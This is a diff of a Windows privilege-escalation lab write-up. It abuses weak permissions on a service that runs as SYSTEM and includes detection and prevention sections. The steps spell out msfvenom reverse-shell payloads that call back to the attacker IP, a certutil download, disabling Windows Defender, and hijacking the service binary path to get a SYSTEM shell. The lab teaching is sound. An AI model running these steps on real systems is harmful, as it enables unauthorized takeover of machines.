@@ -8,36 +8,36 @@
 
 ## Table of Contents
 
-- [Introduction](#Introduction)
-- [Why this attack works](#why-this-attack-works)
-- [Attack flow](#attack-flow)
-- [What I needed before starting](#what-i-needed-before-starting)
-- [What I understood during the process](#what-i-understood-during-the-process)
-
-- [Step 1 — Generating a Malicious Payload with msfvenom](#step-1--generating-a-malicious-payload-with-msfvenom)
-- [Step 2 — Setting Up Metasploit Listener and HTTP Server](#step-2--setting-up-metasploit-listener-and-http-server)
-- [Step 3 — Downloading the Payload on the Victim Machine](#step-3--downloading-the-payload-on-the-victim-machine)
-- [Step 4 — Transferring the Payload to PrivEsc Folder](#step-4--transferring-the-payload-to-privesc-folder)
-- [Step 5 — Running the Payload and Getting a Meterpreter Shell](#step-5--running-the-payload-and-getting-a-meterpreter-shell)
-- [Step 6 — Enumerating the Victim and Uploading winPEAS](#step-6--enumerating-the-victim-and-uploading-winpeas)
-- [Step 7 — Running winPEAS to Find Privilege Escalation Paths](#step-7--running-winpeas-to-find-privilege-escalation-paths)
-- [Step 8 — Verifying Service Permissions with accesschk.exe](#step-8--verifying-service-permissions-with-accesschkexe)
-- [Step 9 — Checking the Service Configuration](#step-9--checking-the-service-configuration)
-- [Step 10 — Generating a New Payload and Starting a Second Listener](#step-10--generating-a-new-payload-and-starting-a-second-listener)
-- [Step 11 — Uploading the New Payload and Changing the Service Binary Path](#step-11--uploading-the-new-payload-and-changing-the-service-binary-path)
-- [Step 12 — Starting the Service and Getting a SYSTEM Shell](#step-12--starting-the-service-and-getting-a-system-shell)
-
-- [How Defenders Can Catch This](#how-defenders-can-catch-this)
-- [How to Prevent It](#how-to-prevent-it)
-- [What I Achieved](#what-i-achieved)
+* [Introduction](#Introduction)
+* [Attack Flow](#attack-flow)
+* [Why This Attack Works](#why-this-attack-works)
+* [Lab Setup](#lab-setup)
+* [Tools Used](#tools-used)
+* [Prerequisites](#prerequisites)
+* [Step 1 — Generating a Malicious Payload with msfvenom](#step-1--generating-a-malicious-payload-with-msfvenom)
+* [Step 2 — Setting Up Metasploit Listener and HTTP Server](#step-2--setting-up-metasploit-listener-and-http-server)
+* [Step 3 — Downloading the Payload on the Victim Machine](#step-3--downloading-the-payload-on-the-victim-machine)
+* [Step 4 — Transferring the Payload to PrivEsc Folder](#step-4--transferring-the-payload-to-privesc-folder)
+* [Step 5 — Running the Payload and Getting a Meterpreter Shell](#step-5--running-the-payload-and-getting-a-meterpreter-shell)
+* [Step 6 — Enumerating the Victim and Uploading winPEAS](#step-6--enumerating-the-victim-and-uploading-winpeas)
+* [Step 7 — Running winPEAS to Find Privilege Escalation Paths](#step-7--running-winpeas-to-find-privilege-escalation-paths)
+* [Step 8 — Verifying Service Permissions with accesschk.exe](#step-8--verifying-service-permissions-with-accesschkexe)
+* [Step 9 — Checking the Service Configuration](#step-9--checking-the-service-configuration)
+* [Step 10 — Generating a New Payload and Starting a Second Listener](#step-10--generating-a-new-payload-and-starting-a-second-listener)
+* [Step 11 — Uploading the New Payload and Changing the Service Binary Path](#step-11--uploading-the-new-payload-and-changing-the-service-binary-path)
+* [Step 12 — Starting the Service and Getting a SYSTEM Shell](#step-12--starting-the-service-and-getting-a-system-shell)
+* [How Defenders Can Catch This](#how-defenders-can-catch-this)
+* [How to Prevent It](#how-to-prevent-it)
+* [References](#references)
+* [Lessons Learned](#lessons-learned)
 
 ## Introduction
 
-Insecure Service Configuration is a local privilege escalation technique. When a Windows service is set up with weak permissions, a low privilege user can modify how that service runs. If the service runs as SYSTEM, I can abuse those weak permissions to run my own code as SYSTEM and take full control of the machine — without any exploit or CVE.
+Insecure Service Configuration is a Windows privilege escalation technique that happens because of weak service permissions.
 
-## Why This Attack Works
+Windows services can run in the background with high privileges. If a normal user has permission to change a service configuration, they can modify how the service runs.
 
-Windows services often run as SYSTEM — the highest privilege account on the machine. If the service permissions are weak enough for a normal user to modify, I can change the binary path to point to my own malicious executable. When the service restarts, it runs my payload as SYSTEM.
+In this attack, I changed the service binary path and pointed it to my own executable. When the service started again, Windows executed my file with the same privileges as the service. Since the service was running as `LocalSystem`, I gained `SYSTEM` access to the machine.
 
 ## Attack Flow
 
@@ -77,21 +77,70 @@ Metasploit caught SYSTEM shell on port 9001
 whoami → nt authority\system
 ```
 
-## Step 1 — Generating a Malicious Payload with msfvenom
+## Why This Attack Works
 
-I used revshells.com to build the msfvenom command, then ran it on my Kali machine to generate a malicious executable.
+Windows services often run with high privileges such as `LocalSystem`. If a normal user can modify the service settings, the user can change the program that the service runs.
+
+The attack works because:
+
+- The service runs as LocalSystem (`SYSTEM`).
+- The user has `SERVICE_CHANGE_CONFIG` permission.
+- The service binary path can be changed by a low privilege user.
+- Windows starts the modified service with the service account privileges.
+
+After changing the service binary path to my executable and restarting the service, Windows ran my file as `SYSTEM`, which gave full control over the machine.
+
+## Lab Setup
+
+| Component          | Details                  |
+| ------------------ | ------------------------ |
+| Attacker Machine   | Kali Linux               |
+| Attacker IP        | `192.168.5.128`          |
+| Victim Machine     | Windows 10 (MSEDGEWIN10) |
+| Victim IP          | `192.168.5.129`          |
+| Network            | VMware Host-Only Network |
+| Domain             | WORKGROUP                |
+| Vulnerable Service | `daclsvc`                |
+
+## Tools Used
+
+| Tool                  | Location                    | Purpose                                  |
+| --------------------- | --------------------------- | ---------------------------------------- |
+| `winPEASany.exe`      | `/home/kali/Desktop/tools/` | Find possible privilege escalation paths |
+| `accesschk.exe`       | `/home/kali/Desktop/tools/` | Check service permissions                |
+| `msfvenom`            | Built into Kali             | Create Windows payloads                  |
+| `Metasploit`          | Built into Kali             | Handle reverse Meterpreter connections   |
+| `certutil`            | Built into Windows          | Download files from a remote server      |
+| `Python3 HTTP Server` | Built into Kali             | Host payload files over HTTP             |
+
+## Prerequisites
+
+Before starting this attack, the following conditions were required:
+
+- A Windows machine with a vulnerable service configuration
+- A low privilege user account on the target machine
+- The vulnerable service must run with `LocalSystem` privileges
+- The current user must have permission to modify the service configuration
+- Network connection between Kali and Windows machine
+- Permission to perform security testing on the target system
+
+
+## Step 1 — Generating a Malicious Payload with `msfvenom`
+
+I used `revshells.com` to prepare the `msfvenom` command and ran it on my Kali machine to create a Windows executable payload.
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o reverse.exe
 ```
+**Breakdown**
 
-### Flag Breakdown
-
-- `-p windows/x64/meterpreter/reverse_tcp`: Generates a 64-bit Windows Meterpreter reverse TCP payload.
-- `LHOST=192.168.5.128`: The IP address of my Kali machine that receives the reverse connection.
-- `LPORT=4444`: The port on my Kali machine that listens for the incoming Meterpreter session.
-- `-f exe`: Generates the payload as a Windows executable (.exe).
-- `-o reverse.exe`: Saves the generated payload as reverse.exe.
+| Part    | Value                                 | Description                                              |
+| ------- | ------------------------------------- | -------------------------------------------------------- |
+| `-p`    | `windows/x64/meterpreter/reverse_tcp` | Creates a 64-bit Windows Meterpreter reverse TCP payload |
+| `LHOST` | `192.168.5.128`                       | Kali machine IP address that receives the connection     |
+| `LPORT` | `4444`                                | Port used by Kali to listen for the Meterpreter session  |
+| `-f`    | `exe`                                 | Creates the payload as a Windows executable file         |
+| `-o`    | `reverse.exe`                         | Saves the payload with the name `reverse.exe`            |
 
 **Output:**
 
@@ -103,15 +152,17 @@ Payload size: 510 bytes
 Final size of exe file: 7680 bytes
 Saved as: reverse.exe
 ```
+The payload was created successfully and saved as `reverse.exe`
+
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step1-1.png" width="600">
 </p>
 
 ## Step 2 — Setting Up Metasploit Listener and HTTP Server
 
-I opened two terminals on Kali — one for the Metasploit listener and one to host the payload over HTTP.
+I opened two terminals on my Kali machine. One terminal was used to start the Metasploit listener, and the other was used to host the payload file over HTTP.
 
-Terminal 1 — Metasploit Listener
+### Terminal 1 — Started Metasploit Listener
 
 ```bash
 msfconsole -q
@@ -130,11 +181,20 @@ run
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step2-1.png" width="600">
 </p>
 
-Terminal 2 — Python HTTP Server
+### Terminal 2 — Started Python HTTP Server
+
+I started a simple HTTP server to share the `reverse.exe` file with the Windows machine.
 
 ```bash
 python3 -m http.server 80
 ```
+**Breakdown**
+
+| Part             | Description                        |
+| ---------------- | ---------------------------------- |
+| `python3`        | Runs Python 3                      |
+| `-m http.server` | Starts a simple HTTP server module |
+| `80`             | Runs the server on port 80         |
 
 **Output:**
 
@@ -147,47 +207,61 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ## Step 3 — Downloading the Payload on the Victim Machine
 
-I switched to the Windows 10 victim machine and opened Microsoft Edge. I browsed to my Kali HTTP server:
+I switched to the Windows 10 victim machine and opened Microsoft Edge. I accessed my Kali HTTP server using the following URL:
 
 ```bash
 http://192.168.5.128/
 ```
-I clicked reverse.exe to download it. Windows Defender blocked it at first — showing "Couldn't download - Virus detected". I turned off Real Time Protection and Threat Protection in Windows Defender settings, then the download went through successfully.
+The reverse.exe file was available on the page. I clicked on it to download the file.
+
+Windows Defender blocked the file at first and showed:
+```
+Couldn't download - Virus detected
+```
+For this lab environment, I disabled Real-time Protection and Threat Protection in Windows Defender settings. After that, the file downloaded successfully.
 
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step3-1.png" width="600">
 </p>
 
-## Step 4 — Transferring the Payload to PrivEsc Folder
+## Step 4 — Transferring the Payload to `C:\PrivEsc` Folder
 
-I opened CMD from C:\PrivEsc and used certutil to download reverse.exe from my Kali HTTP server:
+I opened Command Prompt in the `C:\PrivEsc` folder and used certutil to download `reverse.exe` from my Kali HTTP server.
 
 ```bash
 certutil -urlcache -split -f http://192.168.5.128/reverse.exe reverse.exe
 ```
-### Flag Breakdown
+**Breakdown**
 
-- `-urlcache` : Uses URL cache to download a file
-- `-split` : Splits the download into blocks
-- `-f` : Forces overwrite if file already exists
+| Part        | Description                              |
+| ----------- | ---------------------------------------- |
+| `-urlcache` | Downloads a file from a URL              |
+| `-split`    | Downloads the file in parts              |
+| `-f`        | Overwrites the file if it already exists |
 
 **Output:**
 
 ```text
 CertUtil: -URLCache command completed successfully.
 ```
+The payload was downloaded successfully and saved as `reverse.exe` in the `C:\PrivEsc` folder.
+
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step4-1.png" width="600">
 </p>
 
 ## Step 5 — Running the Payload and Getting a Meterpreter Shell
 
-On the Victim Machine
+On the Windows victim machine, I ran the payload file:
 
 ```bash
 C:\PrivEsc> reverse.exe
 ```
-Metasploit Caught the Connection on Kali
+### Metasploit Caught the Connection on Kali
+
+After running the payload, Metasploit on my Kali machine received the connection and opened a Meterpreter session.
+
+**Output:**
 
 ```text
 [*] Sending stage (244806 bytes) to 192.168.5.129
@@ -195,6 +269,7 @@ Metasploit Caught the Connection on Kali
 
 meterpreter >
 ```
+**Connection details:**
 
 - Attacker IP : 192.168.5.128
 - Victim IP : 192.168.5.129
@@ -205,9 +280,11 @@ meterpreter >
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step5-1.png" width="600">
 </p>
 
-## Step 6 — Enumerating the Victim and Uploading winPEAS
+## Step 6 — Enumerating the Victim and Uploading `winPEAS`
 
-Checked System Info and Current User
+### Checked System Info and Current User
+
+After getting the Meterpreter session, I checked the system information and current user.
 
 ```bash
 meterpreter > sysinfo
@@ -224,24 +301,37 @@ Domain          : WORKGROUP
 Logged On Users : 1
 Meterpreter     : x64/windows
 ```
+I also checked the current user:
 
 ```bash
 meterpreter > getuid
 ```
+**Output:**
+
 ```text
 Server username: MSEDGEWIN10\user
 ```
-I was a normal low privilege user. I needed to get to SYSTEM.
+The session was running under a normal low privilege user account. The next step was to find a way to increase my privileges.
 
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step6-1.png" width="600">
 </p>
 
-Uploaded winPEAS
+### Uploaded `winPEAS`
+
+I uploaded winPEASany.exe from my Kali machine to the Windows victim using Meterpreter.
 
 ```bash
 meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
 ```
+**Breakdown**
+
+| Part                                      | Description                                    |
+| ----------------------------------------- | ---------------------------------------------- |
+| `upload`                                  | Uploads a file from Kali to the victim machine |
+| `/home/kali/Desktop/tools/winPEASany.exe` | Location of the winPEAS file on Kali           |
+
+**Output:**
 
 ```text
 [*] Uploading  : /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
@@ -252,7 +342,9 @@ meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step6-2.png" width="600">
 </p>
 
-## Step 7 — Running winPEAS to Find Privilege Escalation Paths
+## Step 7 — Running `winPEAS` to Find Privilege Escalation Paths
+
+I opened a Windows shell from the Meterpreter session and ran winPEAS to check for possible privilege escalation paths.
 
 ```bash
 meterpreter > shell
@@ -260,12 +352,13 @@ meterpreter > shell
 ```cmd
 C:\PrivEsc> .\winPEASany.exe
 ```
+`winPEAS` scanned the system and found that the `daclsvc` service had weak permissions. The service permissions were not properly configured, which allowed a low privilege user to change the service settings. I selected daclsvc as my target and continued with the next steps.
 
-winPEAS ran a full scan of the machine and flagged the `daclsvc` service as having weak permissions. That was my target.
+## Step 8 — Verifying Service Permissions with `accesschk.exe`
 
-## Step 8 — Verifying Service Permissions with accesschk.exe
+### Uploaded `accesschk.exe`
 
-Uploaded `accesschk.exe`
+I uploaded `accesschk.exe` from my Kali machine to the Windows victim using Meterpreter.
 
 ```bash
 meterpreter > upload /home/kali/Desktop/tools/accesschk.exe
@@ -276,16 +369,31 @@ meterpreter > upload /home/kali/Desktop/tools/accesschk.exe
 [*] Uploaded 217.38 KiB of 217.38 KiB (100.0%): /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
 [*] Completed  : /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
 ```
-
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step8-1.png" width="600">
 </p>
 
-Checked Service Permissions
+### Checked Service Permissions
+
+I used `accesschk.exe` to check what permissions my current user had on the `daclsvc` service.
 
 ```bash
 C:\PrivEsc> .\accesschk.exe /accepteula -uwcqv user daclsvc
 ```
+**Breakdown**
+
+| Part              | Description                                              |
+| ----------------- | -------------------------------------------------------- |
+| `.\accesschk.exe` | Runs `accesschk.exe` from the current folder             |
+| `/accepteula`     | Accepts the Sysinternals license agreement automatically |
+| `-u`              | Shows the service permissions for the specified user     |
+| `-w`              | Shows objects where the user has write permissions       |
+| `-c`              | Checks Windows services                                  |
+| `-q`              | Runs in quiet mode and shows only important information  |
+| `-v`              | Shows detailed information                               |
+| `user`            | The Windows user account being checked                   |
+| `daclsvc`         | The service name being checked                           |
+
 **Output:**
 
 ```
@@ -299,13 +407,14 @@ RW daclsvc
         SERVICE_STOP
         READ_CONTROL
 ```
+The important permissions were:
 
-- `RW daclsvcI` : have read and write access to this service
-- `SERVICE_CHANGE_CONFIGI` : can change the service binary path
-- `SERVICE_START` : I can start the service
-- `SERVICE_STOP` : I can stop the service
+`RW daclsvc` : I had read and write access to the service.
+`SERVICE_CHANGE_CONFIG` : I could change the service configuration, including the binary path.
+`SERVICE_START` : I could start the service.
+`SERVICE_STOP` : I could stop the service.
 
-`SERVICE_CHANGE_CONFIG` was the key. It meant I could swap the binary path to my own payload.
+`SERVICE_CHANGE_CONFIG` was the important permission because it allowed me to change the service executable path and point it to my own payload.
 
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step8-2.png" width="600">
@@ -313,9 +422,19 @@ RW daclsvc
 
 ## Step 9 — Checking the Service Configuration
 
+After confirming that I had permission to modify the service, I checked the service configuration to see how it was running.
+
 ```bash
 C:\PrivEsc> sc qc daclsvc
 ```
+**Breakdown**
+
+| Part      | Description                                             |
+| --------- | ------------------------------------------------------- |
+| `sc`      | Windows Service Control command used to manage services |
+| `qc`      | Displays the service configuration                      |
+| `daclsvc` | The service name being checked                          |
+
 **Output:**
 
 ```
@@ -323,12 +442,12 @@ SERVICE_NAME: daclsvc
         BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
         SERVICE_START_NAME : LocalSystem
 ```
+| Field                | Value                                           | Meaning                                 |
+| -------------------- | ----------------------------------------------- | --------------------------------------- |
+| `BINARY_PATH_NAME`   | `C:\Program Files\DACL Service\daclservice.exe` | Location of the service executable      |
+| `SERVICE_START_NAME` | `LocalSystem`                                   | The service runs with SYSTEM privileges |
 
-```
-|------Field--------|-----------------------Value-------------------|---------------Meaning--------|
-|BINARY_PATH_NAME   |C:\Program Files\DACL Service\daclservice.exe  |Real service binary location  |
-|SERVICE_START_NAME |LocalSystem                                    |Runs as SYSTEM                |
-```
+The output showed that `daclsvc` runs as `LocalSystem`. Since I could change the service configuration, I could replace the binary path with my own payload and run it with `SYSTEM` privileges.
 
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step9-1.png" width="600">
@@ -336,26 +455,38 @@ SERVICE_NAME: daclsvc
 
 ## Step 10 — Generating a New Payload and Starting a Second Listener
 
-I needed a second payload on a different port to catch the SYSTEM shell.
-Generated New Payload on Kali
+I created another payload with a different port. The first listener was already used for the low privilege Meterpreter session, so I used a new port to receive the SYSTEM shell.
+
+### Generated New Payload on Kali
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=9001 -f exe -o privesc.exe
 ```
+**Breakdown**
+
+| Part    | Value                                 | Description                                                     |
+| ------- | ------------------------------------- | --------------------------------------------------------------- |
+| `-p`    | `windows/x64/meterpreter/reverse_tcp` | Creates a Windows Meterpreter reverse TCP payload.              |
+| `LHOST` | `192.168.5.128`                       | The IP address of my Kali machine that receives the connection. |
+| `LPORT` | `9001`                                | The port used to receive the Meterpreter session.               |
+| `-f`    | `exe`                                 | Creates the payload as a Windows executable file.               |
+| `-o`    | `privesc.exe`                         | Saves the payload with the name privesc.exe.                    |
+
 **Output:**
 
 ```
 Final size of exe file: 7680 bytes
 Saved as: privesc.exe
 ```
-
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step10-1.png" width="600">
 </p>
 
-Started Second Metasploit Listener on Port 9001
+### Started Second Metasploit Listener on Port 9001
 
-```
+I started another Metasploit listener on port `9001` to receive the connection after the service runs my payload with SYSTEM privileges.
+
+```bash
 msfconsole -q
 use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -367,19 +498,19 @@ run
 ```
 [*] Started reverse TCP handler on 192.168.5.128:9001
 ```
-
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step10-2.png" width="600">
 </p>
 
 ## Step 11 — Uploading the New Payload and Changing the Service Binary Path
 
-Uploaded privesc.exe
+### Uploaded `privesc.exe`
+
+I uploaded the new payload from my Kali machine to the victim machine using Meterpreter.
 
 ```bash
 meterpreter > upload /home/kali/Desktop/privesc.exe
 ```
-
 **Output:**
 
 ```
@@ -387,16 +518,26 @@ meterpreter > upload /home/kali/Desktop/privesc.exe
 [*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/kali/Desktop/tools/privesc.exe -> privesc.exe
 [*] Completed  : /home/kali/Desktop/tools/privesc.exe -> privesc.exe
 ```
-
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-1.png" width="600">
 </p>
 
-Changed the Service Binary Path
+### Changed the Service Binary Path
+
+The service had `SERVICE_CHANGE_CONFIG permission`, so I changed the service binary path to my uploaded payload.
 
 ```bash
 C:\PrivEsc> sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
 ```
+**Breakdown**
+
+| Part                       | Description                                              |
+| -------------------------- | -------------------------------------------------------- |
+| `sc`                       | Windows Service Control command used to manage services. |
+| `config`                   | Changes the service configuration.                       |
+| `daclsvc`                  | Name of the vulnerable service.                          |
+| `binpath=`                 | Changes the file path that the service runs.             |
+| `"C:\PrivEsc\privesc.exe"` | New executable path that the service will run.           |
 
 **Output:**
 
@@ -404,11 +545,10 @@ C:\PrivEsc> sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
 sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
 [SC] ChangeServiceConfig SUCCESS
 ```
+The service binary path was changed from the original file to my payload.
 
-```
 |------Field--------|-----------------------Before-------------------|---------------After--------|
 |BINARY_PATH_NAME   |C:\Program Files\DACL Service\daclservice.exe   |C:\PrivEsc\privesc.exe      |
-```
 
 <p align="center">
   <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
@@ -416,29 +556,81 @@ sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
 
 ## Step 12 — Starting the Service and Getting a SYSTEM Shell
 
-Started the Service
+### Started the Service
+
+After changing the service binary path, I started the service. The service executed my payload instead of the original file.
 
 ```bash
 C:\PrivEsc> net start daclsvc
 ```
+**Breakdown**
 
-Metasploit Caught the SYSTEM Shell
+| Part      | Description                                                    |
+| --------- | -------------------------------------------------------------- |
+| `net`     | Windows command used to manage services and network resources. |
+| `start`   | Starts a Windows service.                                      |
+| `daclsvc` | Name of the vulnerable service.                                |
 
+### Metasploit Caught the SYSTEM Shell
+
+After the service started, Metasploit received the connection.
 ```
 [*] Meterpreter session 1 opened (192.168.5.128:9001 -> 192.168.5.129:60971) at 2026-06-18 08:03:48 -0400
 ```
+I opened a command shell and checked the current user.
 
 ```bash
 meterpreter > shell
 ```
 ```bash
 C:\Windows\system32>whoami
+```
+**Output:**
+
+```
 nt authority\system
 ```
+I moved from a normal low privilege user to `nt authority\system` by changing the binary path of a service that had weak permissions.
 
-- Attacker IP: `192.168.5.128`
-- Victim IP: `192.168.5.129`
-- Port: `9001`
-- Privilege: `nt authority\system`
+## How Defenders Can Catch This
 
-I went from a normal low privilege user account all the way to nt authority\system just by changing the binary path of a misconfigured service.
+- Regularly check Windows services for unusual permissions.
+- Monitor changes to service configurations, especially `ImagePath` or `BinaryPathName`.
+- Check for normal users having permissions like `SERVICE_CHANGE_CONFIG`.
+- Monitor new executable files appearing in unusual locations such as `C:\PrivEs`c or temporary folders.
+- Review Windows Event Logs for service creation and modification events.
+- Use security tools to detect unexpected services running as `SYSTEM`.
+- Look for suspicious reverse shell connections from service processes.
+
+## How to Prevent It
+
+- Remove unnecessary permissions from normal users on Windows services.
+- Do not allow standard users to change service configurations.
+- Make sure only administrators can modify service binary paths.
+- Run services with the lowest required privileges.
+- Regularly review service permissions and configurations.
+- Keep Windows and installed software updated.
+- Use application control to prevent unknown executables from running.
+- Follow the principle of least privilege.
+
+## References
+
+| Resource | Link |
+|----------|------|
+| Microsoft Service Security and Access Rights Documentation | https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights |
+| Microsoft Service Configuration Documentation | https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config |
+| AccessChk Documentation (Microsoft Sysinternals) | https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk |
+| winPEAS Repository | https://github.com/peass-ng/PEASS-ng |
+| Metasploit Framework Documentation | https://docs.metasploit.com/ |
+
+## Lessons Learned
+
+While working through this attack I learned that:
+
+- A service running as SYSTEM becomes dangerous when normal users can modify its settings.
+- SERVICE_CHANGE_CONFIG permission can allow a low privilege user to replace the service executable path.
+- Always check service permissions during a Windows privilege escalation assessment.
+- Running services with unnecessary privileges increases security risks.
+- Small configuration mistakes can lead to full SYSTEM access.
+- Tools like winPEAS and accesschk.exe help find weak service permissions quickly.
+- Proper service permissions and regular audits can prevent this type of privilege escalation.
